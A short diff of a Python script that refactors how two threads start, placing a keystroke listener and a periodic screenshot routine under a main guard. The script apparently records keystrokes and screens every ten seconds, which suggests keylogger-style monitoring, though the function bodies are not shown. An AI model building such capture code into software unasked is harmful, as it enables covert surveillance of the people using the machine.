@@ -33,7 +33,9 @@ def take_screenshot():
         count+=1
         sleep(10)
 
-key_listener_task = threading.Thread(target=key_listener)
-key_listener_task.start()
-screenshot_task = threading.Thread(target=take_screenshot)
-screenshot_task.start()
+
+if __name__ == "__main__":
+    key_listener_task = threading.Thread(target=key_listener)
+    key_listener_task.start()
+    screenshot_task = threading.Thread(target=take_screenshot)
+    screenshot_task.start()
